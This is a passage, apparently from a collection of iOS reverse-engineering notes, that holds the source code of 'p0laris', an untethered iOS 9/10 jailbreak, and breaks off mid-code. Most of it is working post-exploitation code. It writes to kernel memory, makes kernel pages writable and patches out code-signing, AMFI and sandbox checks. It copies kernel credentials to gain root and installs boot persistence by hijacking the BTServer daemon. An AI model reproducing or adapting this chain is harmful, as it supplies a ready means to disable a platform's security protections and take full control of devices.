@"Wrote file /tmp/SpringBoard.h"

classdumpdyld.dumpBundle([NSBundle mainBundle]);
@"Wrote all headers to /tmp/SpringBoard"

// Dump any bundle other than the main bundle 
classdumpdyld.dumpBundle([NSBundle bundleWithIdentifier:@"com.apple.UIKit"]);
@"Wrote all headers to /tmp/UIKit"

// Dump any image loaded in the process using any class name it contains
classdumpdyld.dumpBundleForClass(CallBarControllerModern);
@"Wrote all headers to /tmp/CallBar7"
```

###  iOS untethered jailbreak for iOS 9.x and 10.x p0laris Implementation principle
```
#include <Foundation/Foundation.h>
#include <UIKit/UIKit.h>
#include <sys/utsname.h>
#include <sys/mount.h>
#include <mach/mach.h>
#include <sys/stat.h>
#include <syslog.h>
#include <dlfcn.h>
#include <spawn.h>

#import "patchfinder.h"
#import "common.h"
#import "sbops.h"
#import "log.h"

/*
 *  I live in a constant state of fear and misery
 *  Do you miss me anymore?
 *  And I don't even notice when it hurts anymore
 *  Anymore, anymore, anymore
 */

#define INSTALL_NONPUBLIC_UNTETHER 0
#define FIRST_TIME_OVERRIDE 0
#define INSTALL_UNTETHER 0
#define BTSERVER_USED 0
#define UNPATCH_PMAP 0
#define ENABLE_DEBUG 0
#define DO_CSBYPASS 0
#define DUMP_KERNEL 0

uintptr_t kernel_base	= -1;
uintptr_t kaslr_slide	= -1;
task_t tfp0				= 0;

uintptr_t kbase(void);
task_t get_kernel_task(void);
void exploit_cleanup(task_t);
int progress(const char* s, ...);
int progress_ui(const char* s, ...);

#define UNSLID_BASE 0x80001000

// A5
uint32_t pmap_addr = 0x003F6454;

uint32_t find_kernel_pmap(void) {
	return pmap_addr + kernel_base;
}

/*
 *  read 4-bytes from address addr from kernel memory
 */
uint32_t kread_uint32(uint32_t addr) {
	vm_size_t bytesRead=0;
	uint32_t ret = 0;
	vm_read_overwrite(tfp0,
					  addr,
					  4,
					  (vm_address_t)&ret,
					  &bytesRead);
	return ret;
}

/*
 *  read a byte from address addr from kernel memory
 */
uint8_t kread_uint8(uint32_t addr) {
	vm_size_t bytesRead=0;
	uint8_t ret = 0;
	vm_read_overwrite(tfp0,
					  addr,
					  1,
					  (vm_address_t)&ret,
					  &bytesRead);
	return ret;
}

/*
 *  write a 4-byte value to address addr in kernel memory
 */
void kwrite_uint32(uint32_t addr, uint32_t value) {
	vm_write(tfp0,
			 addr,
			 (vm_offset_t)&value,
			 4);
}

/*
 *  write a byte value to address addr in kernel memory
 */
void kwrite_uint8(uint32_t addr, uint8_t value) {
	vm_write(tfp0,
			 addr,
			 (vm_offset_t)&value,
			 1);
}

/*
 *  free and nullify pointer macro
 */
void _zfree(void** ptr) {
	free(*ptr);
	*ptr = NULL;
}

#define zfree(ptr) do { _zfree((void**)ptr); } while (0)

extern char **environ;

void run_cmd(char *cmd, ...) {
	pid_t pid;
	va_list ap;
	char* cmd_ = NULL;
	
	va_start(ap, cmd);
	vasprintf(&cmd_, cmd, ap);
	
	char *argv[] = {"sh", "-c", cmd_, NULL};
	
	int status;
	lprintf("Run command: %s", cmd_);
	status = posix_spawn(&pid, "/bin/sh", NULL, NULL, argv, environ);
	if (status == 0) {
		lprintf("Child pid: %i", pid);
		do {
			if (waitpid(pid, &status, 0) != -1) {
				lprintf("Child status %d", WEXITSTATUS(status));
			} else {
				perror("waitpid");
			}
		} while (!WIFEXITED(status) && !WIFSIGNALED(status));
	} else {
		lprintf("posix_spawn: %s", strerror(status));
	}
}

bool exists(char* path) {
	bool ret = false;
	
	/*
	 *  check if file exists and is accessible
	 */
	
	ret = access(path, F_OK) != -1;
	
	return ret;
}

/*
 *  BEGIN ADVANCED BORROWING FROM REALKJCMEMBER
 */
#define TTB_SIZE			4096
#define L1_SECT_S_BIT		(1 << 16)
#define L1_SECT_PROTO		(1 << 1)														/* 0b10 */
#define L1_SECT_AP_URW		(1 << 10) | (1 << 11)
#define L1_SECT_APX			(1 << 15)
#define L1_SECT_DEFPROT		(L1_SECT_AP_URW | L1_SECT_APX)
#define L1_SECT_SORDER		(0)																/* 0b00, not cacheable, strongly ordered. */
#define L1_SECT_DEFCACHE	(L1_SECT_SORDER)
#define L1_PROTO_TTE(entry)	(entry | L1_SECT_S_BIT | L1_SECT_DEFPROT | L1_SECT_DEFCACHE)

uint32_t pmaps[TTB_SIZE];
int pmapscnt = 0;

void patch_kernel_pmap(void) {
	uint32_t kernel_pmap		= find_kernel_pmap();
	uint32_t kernel_pmap_store	= kread_uint32(kernel_pmap);
	uint32_t tte_virt			= kread_uint32(kernel_pmap_store);
	uint32_t tte_phys			= kread_uint32(kernel_pmap_store+4);
	
	lprintf("kernel pmap store @ 0x%08x",
			kernel_pmap_store);
	lprintf("kernel pmap tte is at VA 0x%08x PA 0x%08x",
			tte_virt,
			tte_phys);
	
	/*
	 *  every page is writable
	 */
	uint32_t i;
	for (i = 0; i < TTB_SIZE; i++) {
		uint32_t addr   = tte_virt + (i << 2);
		uint32_t entry  = kread_uint32(addr);
		if (entry == 0) continue;
		if ((entry & 0x3) == 1) {
			/*
			 *  if the 2 lsb are 1 that means there is a second level
			 *  pagetable that we need to give readwrite access to.
			 *  zero bytes 0-10 to get the pagetable address
			 */
			uint32_t second_level_page_addr = (entry & (~0x3ff)) - tte_phys + tte_virt;
			for (int i = 0; i < 256; i++) {
				/*
				 *  second level pagetable has 256 entries, we need to patch all
				 *  of them
				 */
				uint32_t sladdr  = second_level_page_addr+(i<<2);
				uint32_t slentry = kread_uint32(sladdr);
				
				if (slentry == 0)
					continue;
				
				/*
				 *  set the 9th bit to zero
				 */
				uint32_t new_entry = slentry & (~0x200);
				if (slentry != new_entry) {
					kwrite_uint32(sladdr, new_entry);
					pmaps[pmapscnt++] = sladdr;
				}
			}
			continue;
		}
		
		if ((entry & L1_SECT_PROTO) == 2) {
			uint32_t new_entry  =  L1_PROTO_TTE(entry);
			new_entry		   &= ~L1_SECT_APX;
			kwrite_uint32(addr, new_entry);
		}
	}
	
	lprintf("every page is actually writable");
	usleep(100000);
}

void pmap_unpatch(void) {
	while (pmapscnt > 0) {
		uint32_t sladdr  = pmaps[--pmapscnt];
		uint32_t slentry = kread_uint32(sladdr);
		
		/*
		 *  set the 9th bit to one
		 */
		uint32_t new_entry = slentry | (0x200);
		kwrite_uint32(sladdr, new_entry);
	}
}

/*
 *  END ADVANCED BORROWING FROM REALKJCMEMBER
 */

double get_time(void) {
	struct timeval current_time;
	gettimeofday(&current_time, NULL);
	
	return (double)current_time.tv_sec
	+ ((double)current_time.tv_usec / 1000000.0);
}

uint8_t* dump_kernel(uint8_t* kdata, uint32_t len) {
	vm_size_t segment = 0x800;
	
	/*
	 *  0x800 should be faster thx sig
	 */
	
	for (int i = 0; i < len / segment; i++) {
		/*
		 *  DUMP DUMP DUMP
		 */
		
		vm_read_overwrite(tfp0,
						  UNSLID_BASE + kaslr_slide + (i * segment),
						  segment,
						  (vm_address_t)kdata + (i * segment),
						  &segment);
	}
	
	return kdata;
}

extern struct offsets_t* offsets;
extern bool global_untethered;
uint32_t ourcred;
uint32_t myproc;

struct offsets_t* find_offsets(void) {
	/*
	 *  look ma i did a patchfinder
	 *  saves offsets to (docs_dir)/offsets.bin for future use, as the patchfinder
	 *  is kinda slow as balls
	 */
	
	struct offsets_t* offsets   = malloc(sizeof(struct offsets_t));
	uint32_t len				= 32 * 1024 * 1024;
	uint8_t* kdata				= NULL;
	char* open_this				= NULL;
	char* version_string		= (char*)[[[UIDevice currentDevice] systemVersion]
										  UTF8String];
	
	if (!global_untethered) {
		/*
		 *  if we are not running from the untether, check the application docs
		 *  directory for the offsets.bin file. if it exists, read it into the
		 *  offsets struct and return it, otherwise, find our offsets "manually"
		 *  using the patchfinder.
		 */
		
		NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
		NSString *documentsDirectory = [paths firstObject];
		char* doc_dir = (char*)[documentsDirectory UTF8String];
		asprintf(&open_this, "%s/offsets.bin", doc_dir);
		
		if (exists(open_this)) {
			/*
			 *  read from offsets.bin into the offsets struct and return it
			 */
			
			FILE* fp = fopen(open_this, "rb");
			fread(offsets, sizeof(struct offsets_t), 1, fp);
			fclose(fp);
			return offsets;
		}
	} else {
		/*
		 *  if we are running from the untether, read from
		 *  /untether/docs/untether.bin (if the file exists) to get offsets. 
		 *  /untether/docs is a symlink to the normal documents directory. this
		 *  is done because the documents directory appears to be different when
		 *  running untethered.
		 * 
		 *  (also because i originally tried /untether/offsets.bin until i 
		 *   realized we can't read from that path when not jailbroken, lol)
		 */
		
		char* offsets_bin = "/untether/docs/offsets.bin";
		
		if (exists(offsets_bin)) {
			/*
			 *  read from offsets.bin into the offsets struct and return it
			 */
			
			FILE* fp = fopen(offsets_bin, "rb");
			fread(offsets, sizeof(struct offsets_t), 1, fp);
			fclose(fp);
			return offsets;
		}
	}
	
	/*
	 *  dump kernel
	 */
	
	progress_ui("dumping kernel");
	kdata = malloc(len);
	
	dump_kernel(kdata, len);
	
	if (!kdata) {
		/*
		 *  fuck, failed to allocate kdata.
		 * 
		 *  free offsets if it exists, zfree also sets it to NULL. (fuck UAFs)
		 *  (except when i get to exploit them ;))
		 */
		if (offsets)
			zfree(&offsets);
		return NULL;
	}
	
	/*
	 *  make substrate patchfinding a bit faster
	 */
	uint32_t* one_and_two = NULL;
	
	progress_ui("patchfinding...");
	offsets->mount_common						= find_mount_common(kernel_base, kdata, len, version_string);
	offsets->lwvm1								= find_lwvm1(kernel_base, kdata, len, version_string);
	offsets->lwvm2								= find_lwvm2(kernel_base, kdata, len, version_string);
	offsets->lwvm_call							= find_lwvm_call(kernel_base, kdata, len, version_string);
	offsets->lwvm_call_offset					= find_lwvm_call_offset(kernel_base, kdata, len, version_string);
	offsets->sbops								= find_sbops(kernel_base, kdata, len, version_string);
	one_and_two									= find_substrate1_and_2(kernel_base, kdata, len, version_string);
	offsets->substrate1							= one_and_two[0];
	offsets->substrate2							= one_and_two[1];
	offsets->proc_enforce						= find_proc_enforce(kernel_base, kdata, len, version_string);
	offsets->cs_enforcement_disable_amfi		= find_cs_enforcement_disable_amfi(kernel_base, kdata, len, version_string);
	offsets->PE_i_can_has_debugger_1			= find_PE_i_can_has_debugger_1(kernel_base, kdata, len, version_string);
	offsets->PE_i_can_has_debugger_2			= find_PE_i_can_has_debugger_2(kernel_base, kdata, len, version_string);
	offsets->PE_i_can_has_debugger_offset		= find_PE_i_can_has_debugger_offset(kernel_base, kdata, len, version_string);
	offsets->vm_fault_enter_patch				= find_vm_fault_enter_patch(kernel_base, kdata, len, version_string);
	offsets->vm_map_enter_patch					= find_vm_map_enter_patch(kernel_base, kdata, len, version_string);
	offsets->csops								= find_csops(kernel_base, kdata, len, version_string);
	offsets->mapForIO							= find_mapForIO(kernel_base, kdata, len, version_string);
	offsets->sandbox_call_i_can_has_debugger	= find_sandbox_call_i_can_has_debugger(kernel_base, kdata, len, version_string);
	offsets->amfi_file_check_mmap				= find_amfi_file_check_mmap(kernel_base, kdata, len, version_string);
	offsets->allproc							= find_allproc(kernel_base, kdata, len, version_string);
	offsets->tfp0								= find_tfp0(kernel_base, kdata, len, version_string);
	progress_ui("patchfinded");
	
	/*
	 *  write our offsets to docs_dir/offsets.bin
	 */
	
	open_this = NULL;
	
	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
														 NSUserDomainMask,
														 YES);
	NSString *documentsDirectory = [paths firstObject];
	char* doc_dir = (char*)[documentsDirectory UTF8String];
	asprintf(&open_this, "%s/offsets.bin", doc_dir);
	
	FILE* fp = fopen(open_this, "wb");
	fwrite(offsets,
		   sizeof(struct offsets_t),
		   1,
		   fp);
	fclose(fp);
	
	if (one_and_two)
		zfree(&one_and_two);
	
	if (kdata)
		zfree(&kdata);
	
	return offsets;
}

bool patch_kernel(void) {
	bool ret = true;
	
	/* 
	 *  here be dragons, this code is magic
	 */
	
	offsets = find_offsets();
	
	if (offsets == NULL)
		return false;
	
	/* 
	 *  mount stuff
	 */
	lprintf("patching mount_common: 0x%08x,0x%02x",
			kernel_base + offsets->mount_common, 0xe0);
	kwrite_uint8(kernel_base + offsets->mount_common, 0xe0);
	
	/* 
	 *  PE_i_can_has_debugger stuff
	 */
	lprintf("patching PE_i_can_has_debugger_offset: 0x%08x,0x%08x->0x%08x",
			kernel_base + offsets->PE_i_can_has_debugger_offset, kread_uint32(kernel_base + offsets->PE_i_can_has_debugger_offset), 0x20012001);
	kwrite_uint32(kernel_base + offsets->PE_i_can_has_debugger_offset,
				  0x20012001);
	
	/* 
	 *  note for tomorrow / today:
	 *  look into patching time related syscalls in the kernel
	 */
	
	/*
	 *  this AMFI patch is disabled as the offset was probably wrong or something
	 *  for some reason it would make video decoding cause a magical kernel panic
	 */
	
	/* 
	 *  substrate
	 */
	lprintf("patching substrate1: 0x%08x,0x%04x",
			kernel_base + offsets->substrate1,
			0xbf00);
	kwrite_uint8(kernel_base + offsets->substrate1,		0x00);
	kwrite_uint8(kernel_base + offsets->substrate1 + 1,	0xbf);
	
	/* 
	 *  substrate
	 */
	lprintf("patching substrate2: 0x%08x,0x%04x",
			kernel_base + offsets->substrate2,
			0xbf00);
	kwrite_uint8(kernel_base + offsets->substrate2,		0x00);
	kwrite_uint8(kernel_base + offsets->substrate2 + 1,	0xbf);
	
	/* 
	 *  proc_enforce -> 0
	 */
	lprintf("patching proc_enforce: 0x%08x,0x%08x",
			kernel_base + offsets->proc_enforce,
			0x0);
	kwrite_uint32(kernel_base + offsets->proc_enforce,0);
	
	/* 
	 *  cs_enforcement_disable_amfi
	 */
	lprintf("patching cs_enforcement_disable_amfi: 0x%08x,0x%04x",
			kernel_base + offsets->cs_enforcement_disable_amfi - 1,
			0x0101);
	kwrite_uint8(kernel_base + offsets->cs_enforcement_disable_amfi, 1);
	kwrite_uint8(kernel_base + offsets->cs_enforcement_disable_amfi - 1, 1);
	
	/* 
	 *  PE_i_can_has_debugger -> 1
	 */
	lprintf("patching PE_i_can_has_debugger_1: 0x%08x,0x%08x",
			kernel_base + offsets->PE_i_can_has_debugger_1,
			0x1);
	kwrite_uint32(kernel_base + offsets->PE_i_can_has_debugger_1, 1);

	lprintf("patching PE_i_can_has_debugger_2: 0x%08x,0x%08x",
			kernel_base + offsets->PE_i_can_has_debugger_2,
			0x1);
	kwrite_uint32(kernel_base + offsets->PE_i_can_has_debugger_2, 1);
	
	/* 
	 *  vm_fault_enter magic
	 */
	lprintf("patching vm_fault_enter_patch: 0x%08x,0x%04x",
			kernel_base + offsets->vm_fault_enter_patch,
			0x2201);
	kwrite_uint8(kernel_base + offsets->vm_fault_enter_patch, 0x01);
	kwrite_uint8(kernel_base + offsets->vm_fault_enter_patch + 1, 0x22);
	
	/*
	 *  vm_map_enter_patch
	 */
	lprintf("patching vm_map_enter_patch: 0x%08x,0x%08x",
			kernel_base + offsets->vm_map_enter_patch,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->vm_map_enter_patch, 0xbf00bf00);
	
	/*
	 * mapForIO magic
	 */
	lprintf("patching mapForIO: 0x%08x,0x%08x",
			kernel_base + offsets->mapForIO,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->mapForIO, 0xbf00bf00);
	
	/*
	 *  csops magic
	 */
	lprintf("patching csops: 0x%08x,0x%08x",
			kernel_base + offsets->csops,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->csops, 0xbf00bf00);
	
	/*
	 *  amfi_file_check_mmap magic
	 */
	lprintf("patching amfi_file_check_mmap: 0x%08x,0x%08x",
			kernel_base + offsets->amfi_file_check_mmap,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->amfi_file_check_mmap, 0xbf00bf00);
	
	/*
	 *  sandbox_call_i_can_has_debugger magic
	 */
	lprintf("patching sandbox_call_i_can_has_debugger: 0x%08x,0x%08x",
			kernel_base + offsets->sandbox_call_i_can_has_debugger,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->sandbox_call_i_can_has_debugger,0xbf00bf00);
	
	/*
	 *  lwvm
	 */
	lprintf("patching lwvm1: 0x%08x,0x%08x",
			kernel_base + offsets->lwvm1,
			0xf8d1e00f);
	kwrite_uint32(kernel_base + offsets->lwvm1, 0xf8d1e00f);

	lprintf("patching lwvm2: 0x%08x,0x%08x",
			kernel_base + offsets->lwvm2,
			0x2501e003);
	kwrite_uint32(kernel_base + offsets->lwvm2, 0x2501e003);

	lprintf("patching lwvm_call: 0x%08x,0x%08x",
			kernel_base + offsets->lwvm_call,
			kernel_base + offsets->lwvm_call_offset);
	kwrite_uint32(kernel_base + offsets->lwvm_call,
				  kernel_base + offsets->lwvm_call_offset);
	
	/*
	 *  tfp0
	 */
	lprintf("patching tfp0: 0x%08x,0x%08x->0x%08x",
			kernel_base + offsets->tfp0,
			0xbf00bf00);
	kwrite_uint32(kernel_base + offsets->tfp0, 0xbf00bf00);
	
	/*
	 *  fuck the sandbox
	 */
	lprintf("nuking sandbox @ 0x%08x", kernel_base + offsets->sbops);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0);
	kwrite_uint32(kernel_base + offsets->sbops + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0);
	
	/*
	 *  get kernel credentials so we can get our friend, uid=0.
	 */
	lprintf("stealing kernel creds");
	uint32_t allproc_read	= kread_uint32(kernel_base + offsets->allproc);
	lprintf("uint32_t allproc = 0x%08x, uint32_t allproc_read = 0x%08x;",
			kernel_base + offsets->allproc,
			allproc_read);
	pid_t our_pid		= getpid();
	lprintf("our_pid = %d", our_pid);
	
	myproc				= 0;
	uint32_t kernproc	= 0;
	
	/*
	 *  this code traverses a linked list in kernel memory to find the processes.
	 *  cleaned up
	 * 
	 *  struct proc {
	 * 	 LIST_ENTRY(proc) p_list;	// List of all processes.		//
	 * 
	 * 	 pid_t	   p_pid;		  // Process identifier. (static)	//
	 * 	 void *	  task;		   // corresponding task (static)		//
	 * 	 ...
	 *  };
	 * 
	 *  #define LIST_ENTRY(type)											\
	 *  struct {															\
	 * 	 struct type *le_next;		// next element						//  \
	 * 	 struct type **le_prev;		// address of previous next element //  \
	 *  }
	 * 
	 *  sizeof(uintptr_t) on 32-bit = 4
	 *  2 pointers = 2 * 4 = 8
	 *  offset of p_pid = 8
	 *  the next proc entry is the first pointer in the LIST_ENTRY struct, which is conveniently
	 *  the first element in the proc struct.
	 *  therefore, offset of the next proc entry is 0
	 * 
	 *  loop through the linked list by getting allproc
	 *  check the pid, and compare it to ours or the kernels
	 *  save it if it's either, otherwise continue
	 * 
	 *  eventually at the end we have the addresses of the kernel's proc struct and ours.
	 *  now we do writing magic to get kernel privs :P
	 */
	
	if (allproc_read != 0) {
		while (myproc == 0 || kernproc == 0) {
			uint32_t kpid = kread_uint32(allproc_read + 8);
			if (kpid == our_pid) {
				myproc = allproc_read;
				lprintf("found myproc 0x%08x, %d", myproc, kpid);
			} else if (kpid == 0) {
				kernproc = allproc_read;
				lprintf("found kernproc 0x%08x, %d", kernproc, kpid);
			}
			allproc_read = kread_uint32(allproc_read);
		}
	} else {
		/* fail */
		return false;
	}
	
	/*
	 *  TODO: don't hardcode 0xa4, ideally write patchfinder code for it
	 */
	
	uint32_t kern_ucred = kread_uint32(kernproc + 0xa4);
	lprintf("uint32_t kern_ucred = 0x%08x;", kern_ucred);
	
	ourcred = kread_uint32(myproc + 0xa4);
	lprintf("uint32_t ourcred = 0x%08x;", ourcred);

	/*
	 *  i am (g)root
	 */
	kwrite_uint32(myproc + 0xa4, kern_ucred);
	setuid(0);
	
	return ret;
}

void easy_spawn(char* bin, char* argv[]) {
	pid_t pid;
	int status;
	status = posix_spawn(&pid, bin, NULL, NULL, argv, environ);
	if (status == 0) {
		lprintf("Child pid: %i", pid);
		do {
			if (waitpid(pid, &status, 0) != -1) {
				lprintf("Child status %d", WEXITSTATUS(status));
			} else {
				perror("waitpid");
			}
		} while (!WIFEXITED(status) && !WIFSIGNALED(status));
	} else {
		lprintf("posix_spawn: %s", strerror(status));
	}
}

NSString* resource_path = NULL;
char* bundle_path(char* path) {
	char* ret = NULL;
	
	if (!resource_path)
		resource_path = [[NSBundle mainBundle] resourcePath];
	
	ret = (char*)[[resource_path stringByAppendingPathComponent:
				   [NSString stringWithUTF8String:path]] UTF8String];
	
	return ret;
}

#if INSTALL_UNTETHER
#if !INSTALL_NONPUBLIC_UNTETHER
bool install_untether(void) {
	bool ret = true;
	
	/*
	 *  if re-installing, remove the previous untether directory
	 */
	run_cmd("rm -rf /untether");
	
	/*
	 *  probably shouldn't be 777, will look into later
	 */
	mkdir("/untether", 0777);
	
	/*
	 *  get path of p0laris, and symlink it for the final 0wnage
	 */
	char* bin_path = bundle_path("p0laris");
	symlink(bin_path, "/untether/p0laris");
	
	/*
	 *  make /usr/local/bin
	 *  sandbox policy bypass allows you to use arbitrary interpreter binaries
	 *  IF you put them at specific locations.
	 *  you can not use a symlink, the actual binary must be at the location.
	 *  decompiled sandbox policies:
	 *    (deny process-exec-interpreter
	 *    (require-all
	 * 	(require-not (debug-mode))
	 * 	(require-all (require-not (literal "/bin/sh"))
	 * 	 (require-not (literal "/bin/bash"))
	 * 	 (require-not (literal "/usr/bin/perl"))
	 * 	 (require-not (literal "/usr/local/bin/scripter"))		<- i use this one
	 * 	 (require-not (literal "/usr/local/bin/luatrace"))
	 * 	 (require-not (literal "/usr/sbin/dtrace")))))
	 * 
	 *   source: https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-1.html
	 */
	mkdir("/usr/local/", 0777);
	mkdir("/usr/local/bin/", 0777);
	
	/*
	 *  important:
	 *  DO NOT symlink, this will not work,
	 *  as the binary will still be located at its previous path.
	 * 
	 *  actually copy the full executable, permissions and all, to the new path.
	 */
	run_cmd("/bin/cp -p /sbin/mount /usr/local/bin/scripter");
	
	/*
	 *  now for the actual persistence bug.
	 *  this next bit is stolen from the untether gist, as i'm too lazy to rewrite it.
	 *
	 *  bug3:
	 *  platform-application bypass,
	 *  custom filesystem
	 *  directory structure:
	 *  /System/Library/Filesystems/hax.fs:
	 *  /System/Library/Filesystems/hax.fs/Contents:
	 *  /System/Library/Filesystems/hax.fs/Contents/Resources:
	 *  /System/Library/Filesystems/hax.fs/Contents/Resources/mount_hax -> symlink to your haxxx
	 *
	 *  cp -p /sbin/mount to /usr/local/bin/scripter (bypass some sandbox stuff)
	 *  replace a daemon with an executable containing this:
	 *  #!/usr/local/bin/scripter -t hax fake
	 *
	 *
	 *
	 *  the last argument is automatically filled in with the executable path,
	 *  so mount finds an existing path, and attempts to mount "fake" (taken as /fake as it runs in /)
	 *  on that path, with the filesystem hax, which executes our code.
	 *  replace a daemon like wifiFirmwareLoaderLegacy
	 *  either do the same SUID trick, for untethered, sandboxed code exec as mobile (tired)
	 *  or use psychicpaper and get untethered, unsandboxed code exec as root (wired)
	 *  boom, BFU code exec on 9.xish -> 12.xish
	 *
	 *  BACK TO MY COMMENTS
	 *  i find it a little more smexy to use a symlink and keep
	 *  code_exec_fs.fs in a folder along with the rest of the vuln stuff, so symlinks abound
	 */
	
	mkdir("/untether/code_exec_fs.fs",						 0755);
	mkdir("/untether/code_exec_fs.fs/Contents",			 0755);
	mkdir("/untether/code_exec_fs.fs/Contents/Resources",	0755);
	
	symlink("/untether/code_exec_fs.fs",	"/System/Library/Filesystems/code_exec_fs.fs");
	symlink("/untether/code_exec_fs.fs",	"/Library/Filesystems/code_exec_fs.fs");
	symlink("/untether/p0laris",			"/untether/code_exec_fs.fs/Contents/Resources/mount_code_exec_fs");
	
	/*
	 *  i forgot to add you actually need to have
	 *  some data after the shebang, otherwise it won't work.
	 */
	FILE* fp = fopen("/untether/get_code_exec", "w");
	fprintf(fp, "#!/usr/local/bin/scripter -t code_exec_fs untether\n\n\nkek");
	fclose(fp);
	
	/*
	 *  chmod'ing for security & being able to execute and shit
	 */
	chown("/untether/p0laris",													501, 501);
	chown("/untether/code_exec_fs.fs/Contents/Resources/mount_code_exec_fs",	501, 501);
	chown("/untether/get_code_exec",											501, 501);
	chmod("/untether/p0laris",													04755);
	chmod("/untether/code_exec_fs.fs/Contents/Resources/mount_code_exec_fs",	04755);
	chmod("/untether/get_code_exec",											04755);
	
	/*
	 *  don't remove original wifiFirmwareLoader in case we're re-installing,
	 *  only rename original if the path used for the "backup", so to speak
	 *  exists.
	 */
	if (!exists("/usr/sbin/BTServer_"))
		rename("/usr/sbin/BTServer",	"/usr/sbin/BTServer_");
	
	symlink("/untether/get_code_exec",				"/usr/sbin/BTServer");
	
	/*
	 *  more chmod'ing
	 */
	chown("/usr/sbin/BTServer",	501, 501);
	chown("/untether/get_code_exec",			501, 501);
	chown("/usr/local/bin/scripter",			501, 501);
	
	chmod("/usr/sbin/BTServer",	04755);
	chmod("/untether/get_code_exec",			04755);
	chmod("/usr/local/bin/scripter",			04755);
	
	/*
	 *  logging, also so the patchfinder can grab offsets from the filesystem,
	 *  instead of patchfinding every time, which is slow...
	 */
	NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
	NSString *documentsDirectory = [paths firstObject];
	char* doc_dir = (char*)[documentsDirectory UTF8String];
	
	symlink(doc_dir, "/untether/docs");
	
#if DO_CSBYPASS
	/*
	 *  logs
	 */
	lprintf("SPV vs CODESIGNING!\n");
	lprintf("FIGHT!\n");
	
	/*
	 * find csbypass in the app container
	 */
	char* csbypass = bundle_path("csbypass");
	
	/*
	 *  copy it to the untether folder & make it executable
	 */
	run_cmd("/bin/cp %s /untether/csbypass", csbypass);
	run_cmd("chmod 755 /untether/csbypass");
	
	/*
	 *  find game over in the app container
	 */
	char* game_over_armv7 = bundle_path("game_over_armv7.dylib1");
	
	/*
	 *  copy it to the untether folder & make it executable
	 */
	run_cmd("/bin/cp %s /untether/game_over_armv7.dylib1", game_over_armv7);
	run_cmd("chmod 755 /untether/game_over_armv7.dylib1");
	
	/*
	 *  get time
	 */
	time_t val = time(NULL);
	
	/*
	 *  write time for offsetting
	 */
	FILE* fp_ = fopen("/untether/offset", "wb");
	fwrite(&val, sizeof(val), 1, fp_);
	fclose(fp);
	
	/*
	 *  set time to zero
	 */
	lprintf("[*] __OFFSET *should* equal %ld", val);
	run_cmd("/bin/date -s @0");
	
	/*
